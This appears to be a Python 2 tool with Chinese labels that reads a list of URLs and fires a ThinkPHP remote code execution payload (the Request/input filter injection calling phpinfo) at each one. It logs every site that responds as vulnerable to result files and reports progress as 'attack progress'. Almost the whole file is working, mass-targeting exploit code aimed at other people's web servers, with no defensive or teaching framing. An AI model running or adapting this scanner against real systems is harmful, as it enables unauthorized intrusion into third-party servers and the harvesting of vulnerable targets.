# coding=utf-8
import requests
from termcolor import cprint
from bs4 import BeautifulSoup

filename = raw_input("请输入url文件:")
f = open(filename)
#fl = list(set(f))
num = 1
f = list(f)
allnum = len(f)

headers = {}
user_agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0"
headers["User-Agent"] = user_agent



for url in f:
    url = url.strip("\r\n")
    if len(url)>6:
        try:
            rurl = url + "/public/index.php?s=index/\think\Request/input&filter=phpinfo&data=1"
            #print(rurl)
            print("攻击进度:%d/%d"%(num,allnum))
            response = requests.get(rurl,headers=headers,timeout=3)
            html = BeautifulSoup(response.text,'html.parser')
            #print(html)
            title = html.find("title").text
            #print(title)
            if "System Error" in title or "php.ini" in response.content or "Server API" in response.content or "PHP API" in response.content or "PHP Version" in response.content:
                cprint(str(title)+"[+]存在php远程代码执行漏洞...(高危)\tpayload: "+rurl, "red")
                a = open("扫描结果/精确1.txt",'a')
                a.writelines(url+"\r\n")
                num = num + 1
            elif "phpinfo" in title:
                cprint(str(title)+"[+]存在php远程代码执行漏洞...(高危)\tpayload: "+rurl, "red")
                g = open("扫描结果/phpinfo.txt",'a')
                g.writelines(url+"\r\n")
                num = num + 1 
            else:
                cprint("[+]不存在php远程代码执行漏洞"+url,"white", "on_grey")
                num = num + 1
        except requests.exceptions.ContentDecodingError:
            num = num + 1
            continue
        except requests.exceptions.TooManyRedirects:
            num = num + 1
            continue
        except requests.exceptions.ConnectionError:
            num = num + 1
            continue
        except requests.exceptions.ReadTimeout:
            num = num + 1
            continue        
        except TypeError:
            cprint(str(title)+"[+]TypeError\tpayload: "+rurl, "red")
            a = open("扫描结果/TypeError.txt",'a')
            a.writelines(url+"\r\n")
            num = num + 1
            continue
        except AttributeError:
            cprint("[+]AttributeError\tpayload: "+rurl, "white")
            h = open("扫描结果/AttributeError.txt",'a')
            h.writelines(url+"\r\n")
            num = num + 1
            continue
        except requests.exceptions.InvalidURL:
            num = num + 1
            continue
